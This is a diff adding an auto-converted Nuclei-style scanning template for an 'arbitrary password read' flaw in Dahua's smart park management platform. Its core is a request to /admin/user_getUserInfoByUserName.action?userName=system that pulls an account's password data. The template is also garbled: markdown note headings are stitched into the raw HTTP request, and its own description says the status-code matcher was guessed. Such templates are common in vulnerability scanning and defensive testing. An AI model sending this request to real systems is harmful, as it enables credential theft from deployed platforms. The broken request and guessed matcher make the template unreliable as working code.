@@ -1,0 +1,36 @@
+id: poc-su8yak4ctq82rggo
+info:
+  name: 大华智慧园区综合管理平台 user_getUserInfoByUserName.action 任意密码读取漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/su8yak4ctq82rggo
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: su8yak4ctq82rggo
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
